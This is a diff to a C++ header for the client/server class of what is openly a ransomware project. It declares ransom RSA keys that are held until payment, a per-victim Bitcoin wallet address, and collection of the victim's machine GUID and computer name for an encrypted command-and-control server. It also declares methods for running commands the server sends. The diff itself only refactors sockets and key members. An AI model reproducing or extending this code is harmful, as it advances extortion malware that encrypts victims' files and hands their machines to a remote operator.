@@ -15,7 +15,6 @@
 #include <algorithm>
 #include <thread>
 #include <random>
-#include <openssl/bio.h>
 #include <filesystem>
 
 #define WIN32_LEAN_AND_MEAN
@@ -34,11 +33,10 @@ public:
     void               SetRansomSecrets(RSAKeys& keys) { this->m_RansomSecrets = keys; }
 
 private:
-    std::string        m_ComputerName   = "";  // remote host computer name. e.g DESKTOP-AJDU31S
-    std::string        m_MachineGUID    = "";  // remote host windows machine guid. e.g 831js9fka29-ajs93j19sa82....    
-    RSAKeys            m_RequestSecrets = {}; // RSA key pair used to encrypt and decrypt requests to and from server
-    RSAKeys            m_RansomSecrets  = {}; // RSA key pair used to encrypt and decrypt files. public key only stored on client until ransom is paid
-    SOCKET             m_UDPSocket      = INVALID_SOCKET;
+    std::string        m_ComputerName   = "";       // remote host computer name. e.g DESKTOP-AJDU31S
+    std::string        m_MachineGUID    = "";       // remote host windows machine guid. e.g 831js9fka29-ajs93j19sa82....    
+    RSAKeys            m_RequestSecrets = {};       // RSA key pair used to encrypt and decrypt requests to and from server
+    RSAKeys            m_RansomSecrets  = {};       // RSA key pair used to encrypt and decrypt files. public key only stored on client until ransom is paid
     SOCKET             m_TCPSocket      = INVALID_SOCKET;
 
 #ifdef CLIENT_RELEASE                               // Client only methods
@@ -56,7 +54,6 @@ public:
     BOOL               PerformCommand(const ServerCommand& command, ClientResponse& outResponse); // Perform a command from the tcp server
     BYTESTRING         GetCommand();
 
-
     template <typename _Ty>
     BOOL               GetEncryptedMessageOnServer(const Server& dest, _Ty& out);
 
@@ -64,28 +61,27 @@ public:
     BOOL               ReceiveMessageFromServer(const Server& who, _Ty& out, sockaddr_in& outAddr);
 
 private:
-    void               ReceiveCommandsFromServer(); // thread to continuously receive 'ServerCommand' messages from the server
     void               SetRemoteComputerName();     // set this->m_ComputerName to the current PCs desktop name
     void               SetRemoteMachineGUID();      // set this->m_MachineGUID to the current PCs windows machine guid
-    BOOL               GetRequestRSAKeysFromServer(); // get public rsa key from server, save it to this->m_Secrets as a string
     BOOL               SendMachineGUIDToServer();   // send machine guid to tcp server. encrypted
     BOOL               SendComputerNameToServer();  // send desktop computer name to tcp server. encrypted
     BOOL               IsServerAwaitingResponse(const ServerCommand& commandPerformed);
-    BOOL               ExchangePublicKeys(); // send client public key, receive server public key
+    BOOL               ExchangePublicKeys();        // send client public key, receive server public key
 
     ProcessManager     m_ProcMgr          = {};     // remote host process manager
     Server             m_TCPServerDetails = {};     // details describing the tcp server
     Server             m_UDPServerDetails = {};     // details about the UDP communication
-    ClientRSAKey       m_ClientKeys = {};
+    RSA*               m_ServerPublicKey  = {};
+    SOCKET             m_UDPSocket        = INVALID_SOCKET;
 
 #elif defined(SERVER_RELEASE)                       // Server only client implementation
 public:
     Client() = default;
-    Client(SOCKET tcp, SOCKET udp, sockaddr_in addr);
+    Client(SOCKET tcp, sockaddr_in addr);
 
     void               Disconnect();                // clean up and close sockets. free bio* secrets
     const sockaddr_in  GetAddressInfo()            const { return this->AddressInfo; }
-    const SOCKET       GetSocket(SocketTypes type) const { return ( type == TCP ) ? this->m_TCPSocket : this->m_UDPSocket; }
+    const SOCKET       GetSocket()                 const { return this->m_TCPSocket; }
     const RSAKeys&     GetRequestSecrets()         const { return this->m_RequestSecrets; }
 
     std::string        UniqueBTCWalletAddress;      // Wallet address to send ransom money to
@@ -93,7 +89,7 @@ public:
     long               ClientUID        = -1;       // unique client id for the server
     sockaddr_in        AddressInfo      = {};       // Address info for the eserver to send messages over udp 
     BOOL               Alive            = TRUE;
-    ServerRSAKey       ExchangedKeys    = {}; // client public key with server pub and private keys
+    RSA*               ClientPublicKey = {};
 
     /*
         Implementation for event handling- to wait
